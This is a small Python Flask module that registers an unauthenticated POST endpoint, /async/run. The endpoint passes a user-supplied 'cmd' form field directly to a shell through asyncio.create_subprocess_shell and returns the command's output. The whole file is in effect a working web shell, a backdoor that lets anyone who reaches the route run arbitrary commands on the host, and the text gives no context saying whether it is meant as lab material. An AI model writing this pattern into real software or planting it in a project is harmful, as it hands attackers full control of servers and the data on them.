from flask import request
import asyncio
import subprocess

def init(app):

        @app.route('/async/run', methods=['POST'])
        async def async_run():
                cmd = request.form.get("cmd", "")
                if not cmd:
                        cmd = ""

                proc = await asyncio.create_subprocess_shell(
                        cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                )

                out, err = await proc.communicate()
                return out.decode() + err.decode()